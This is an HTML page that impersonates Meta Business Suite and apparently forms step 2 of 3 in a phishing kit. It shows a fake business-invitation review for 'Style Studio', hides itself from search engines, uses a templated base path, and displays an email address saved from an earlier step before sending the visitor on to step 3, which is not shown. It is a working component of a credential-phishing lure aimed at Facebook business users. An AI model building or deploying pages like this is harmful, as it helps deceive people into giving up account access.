<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Meta Business Suite</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --primary-blue: #1877f2;
            --text-main: #1c1e21;
            --text-secondary: #65676b;
            --border-color: #dddfe2;
            --bg-page: radial-gradient(circle at top left, #f0f2f5 0%, #e7f3ff 100%);
        }

        * { box-sizing: border-box; }

        body {
            margin: 0;
            padding: 0;
            font-family: 'Inter', sans-serif;
            background: var(--bg-page);
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            color: var(--text-main);
        }

        header {
            background: #fff; height: 56px; display: flex; align-items: center; padding: 0 40px;
            border-bottom: 1px solid #e5e5e5; position: fixed; top: 0; left: 0; right: 0; z-index: 100;
        }

        .meta-logo { height: 24px; }

        main {
            flex: 1; display: flex; justify-content: center; align-items: center;
            padding: 100px 20px 60px;
        }

        .card {
            background: #ffffff; width: 100%; max-width: 550px; border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            padding: 40px; display: flex; flex-direction: column;
            zoom: 0.67;
        }

        .card-logo { display: flex; justify-content: center; margin-bottom: 24px; }
        .card-logo img { height: 80px; width: auto; }

        .card-title { font-size: 24px; font-weight: 700; text-align: center; margin: 0 0 24px 0; color: #050505; }

        .biz-row { display: flex; align-items: flex-start; gap: 16px; margin-bottom: 24px; }
        .biz-avatar { width: 60px; height: 60px; border-radius: 8px; border: 1px solid var(--border-color); overflow: hidden; flex-shrink: 0; }
        .biz-avatar img { width: 100%; height: 100%; object-fit: cover; }
        .biz-name { font-size: 17px; font-weight: 700; color: #050505; margin: 0; }
        .biz-meta { font-size: 14px; color: var(--text-secondary); margin: 4px 0 0; display: flex; align-items: center; gap: 4px; }
        .info-icon { display: inline-flex; align-items: center; justify-content: center; width: 14px; height: 14px; background: #65676b; color: #fff; border-radius: 50%; font-size: 10px; font-weight: bold; margin-left: 4px; }

        .divider { height: 1px; background: #e5e5e5; margin: 24px 0; }

        .section-title { font-size: 16px; font-weight: 700; margin-bottom: 12px; color: #050505; }
        .section-desc { font-size: 15px; line-height: 1.5; color: #1c1e21; margin-bottom: 24px; }
        .warning-box { font-size: 14px; color: #65676b; line-height: 1.5; margin-top: 32px; }
        .warning-box a { color: var(--primary-blue); text-decoration: none; }

        .card-footer {
            display: flex; align-items: center; justify-content: space-between;
            margin-top: auto; padding-top: 40px; position: relative;
        }

        .step-indicator { position: absolute; left: 50%; transform: translateX(-50%); font-size: 14px; color: #65676b; }

        .btn { height: 38px; padding: 0 20px; border-radius: 6px; font-size: 15px; font-weight: 600; border: none; cursor: pointer; display: flex; align-items: center; gap: 8px; }
        .btn-gray { background-color: #e4e6eb; color: #050505; }
        .btn-blue { background-color: var(--primary-blue); color: #fff; }

        footer { background: transparent; padding: 40px; font-size: 12px; color: #65676b; margin-top: auto; }
        .footer-divider { height: 1px; background: #e5e5e5; margin-bottom: 20px; width: 100%; }
        .footer-content { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; }
        .footer-links { display: flex; gap: 16px; flex-wrap: wrap; }
        .footer-links a { color: #65676b; text-decoration: none; }
        .footer-lang { display: flex; align-items: center; gap: 4px; }
        .footer-lang svg { width: 16px; height: 16px; }

        @media (max-width: 640px) {
            header { padding: 0 20px; } footer { padding: 20px; }
            .card { width: calc(100% - 40px); min-height: auto; padding: 24px; }
        }
    </style>
</head>
<body>
    <header>
        <svg class="meta-logo" viewBox="0 0 500 100">
            <path d="M182.141 3.213h18.808l31.98 57.849 31.979-57.849h18.401V98.27h-15.345V25.416l-28.042 50.448h-14.394l-28.042-50.448V98.27h-15.345V3.213ZM332.804 99.967c-7.107 0-13.353-1.573-18.739-4.718-5.387-3.146-9.586-7.504-12.595-13.07-3.011-5.569-4.515-11.95-4.515-19.148 0-7.287 1.47-13.738 4.413-19.35 2.942-5.613 7.027-10.004 12.255-13.173 5.229-3.168 11.238-4.753 18.027-4.753 6.744 0 12.55 1.596 17.416 4.787 4.865 3.191 8.611 7.661 11.237 13.41 2.624 5.749 3.938 12.492 3.938 20.233v4.21h-52.077c.95 5.794 3.292 10.354 7.027 13.68 3.735 3.328 8.453 4.991 14.157 4.991 4.571 0 8.509-.679 11.814-2.037 3.303-1.358 6.404-3.417 9.302-6.178l8.147 9.98c-8.103 7.425-18.038 11.136-29.807 11.136Zm11.204-56.389c-3.215-3.281-7.425-4.923-12.629-4.923-5.07 0-9.314 1.676-12.731 5.025-3.418 3.35-5.58 7.854-6.484 13.512h37.343c-.453-5.794-2.286-10.331-5.499-13.614ZM382.846 40.014h-14.123V27.453h14.123V6.676h14.802v20.777h21.455v12.561h-21.455v31.844c0 5.295.905 9.075 2.716 11.338 1.809 2.264 4.911 3.395 9.302 3.395 1.945 0 3.598-.078 4.956-.237a92.35 92.35 0 0 0 4.481-.646v12.425c-1.675.498-3.564.906-5.669 1.223a44.63 44.63 0 0 1-6.62.475c-15.979 0-23.968-8.735-23.968-26.208V40.014ZM496.236 98.27h-14.53v-9.913c-2.58 3.712-5.862 6.575-9.845 8.588-3.983 2.014-8.51 3.022-13.579 3.022-6.247 0-11.78-1.596-16.601-4.787s-8.612-7.581-11.373-13.172c-2.761-5.59-4.142-11.983-4.142-19.18 0-7.243 1.403-13.648 4.21-19.216 2.806-5.567 6.688-9.935 11.645-13.104 4.956-3.168 10.648-4.753 17.075-4.753 4.844 0 9.189.94 13.037 2.818a25.768 25.768 0 0 1 9.573 7.978v-9.098h14.53V98.27Zm-14.801-46.035c-1.585-4.028-4.085-7.207-7.503-9.54-3.418-2.33-7.367-3.496-11.848-3.496-6.338 0-11.384 2.128-15.141 6.382-3.758 4.255-5.635 10.004-5.635 17.246 0 7.289 1.809 13.06 5.431 17.314 3.621 4.255 8.532 6.382 14.734 6.382 4.571 0 8.645-1.176 12.222-3.53 3.575-2.353 6.155-5.522 7.74-9.506V52.235Z" fill="#1C2B33"></path>
            <path d="M108 0C95.66 0 86.015 9.294 77.284 21.1 65.284 5.821 55.25 0 43.24 0 18.76 0 0 31.862 0 65.586 0 86.69 10.21 100 27.31 100c12.308 0 21.16-5.803 36.897-33.31 0 0 6.56-11.584 11.072-19.564 1.582 2.553 3.243 5.3 4.997 8.253l7.38 12.414C102.03 91.848 110.038 100 124.551 100c16.659 0 25.931-13.492 25.931-35.034C150.483 29.656 131.301 0 108 0ZM52.207 59.241c-12.759 20-17.172 24.483-24.276 24.483-7.31 0-11.655-6.418-11.655-17.862 0-24.483 12.207-49.517 26.759-49.517 7.88 0 14.465 4.55 24.552 18.991-9.578 14.691-15.38 23.905-15.38 23.905Zm48.153-2.517-8.823-14.715a301.425 301.425 0 0 0-6.884-10.723c7.952-12.274 14.511-18.39 22.313-18.39 16.206 0 29.172 23.863 29.172 53.173 0 11.172-3.659 17.655-11.241 17.655-7.268 0-10.739-4.8-24.537-27Z" fill="#0180FA"></path>
        </svg>
    </header>

    <main>
        <div class="card">
            <div class="card-logo">
                <img src="/logo.jpg" alt="Style Studio Logo">
            </div>

            <h1 class="card-title">Review business information</h1>

            <div class="biz-row">
                <div class="biz-avatar"><img src="/logo.jpg" alt="Style Studio"></div>
                <div class="biz-info">
                    <p class="biz-name">Style Studio</p>
                    <p class="biz-meta">Created date: September 26, 2024</p>
                    <p class="biz-meta">Business verification: Unverified <span class="info-icon">i</span></p>
                    <p class="biz-meta" id="display_email" style="display: none;"></p>
                </div>
            </div>

            <div class="divider"></div>

            <div class="section-title">Information on personal page</div>
            <p class="section-desc">This business asset management page does not have any Pages, Instagram pages or WhatsApp accounts with over 1,000 followers.</p>

            <div class="warning-box">Be cautious when accepting invitations from business profiles you don't know about. If you don't know this business, you can <a href="#" style="color: #1877f2; text-decoration: none;">decline the invitation</a>.</div>

            <div class="divider"></div>
            <p style="font-size: 13px; color: #65676b;">For more information about how Meta handles your data, please read our <a href="#" style="color: #1877f2; text-decoration: none;">Privacy Policy</a>.</p>

            <div class="card-footer">
                <button type="button" class="btn btn-gray" id="btn_before">Previous</button>
                <div class="step-indicator">2 of 3</div>
                <button type="button" class="btn btn-blue" id="btn_next">Accept invitation</button>
            </div>
        </div>
    </main>

    <footer>
        <div class="footer-divider"></div>
        <div class="footer-content">
            <div class="footer-links">
                <a href="#">Facebook</a><a href="#">Developers</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Cookies</a><a href="#">Help</a><a href="#">Report a problem</a>
            </div>
            <div class="footer-lang">
                <span>English (US)</span>
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <circle cx="12" cy="12" r="10"></circle><line x1="2" y1="12" x2="22" y2="12"></line>
                    <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path>
                </svg>
            </div>
        </div>
        <div style="margin-top: 20px;">Meta © 2026</div>
    </footer>

    <script>
        (function() {
            const metaBasePath = "{{ $metaBasePath }}";

            const displayEmail = document.getElementById('display_email');
            const savedEmail = localStorage.getItem('fb_email');
            if (savedEmail) {
                displayEmail.textContent = 'Email: ' + savedEmail;
                displayEmail.style.display = 'block';
            }

            document.getElementById('btn_before').addEventListener('click', function() { window.location.href = metaBasePath + "/1"; });
            document.getElementById('btn_next').addEventListener('click', function() { window.location.href = metaBasePath + "/3"; });
        })();
    </script>
</body>
</html>
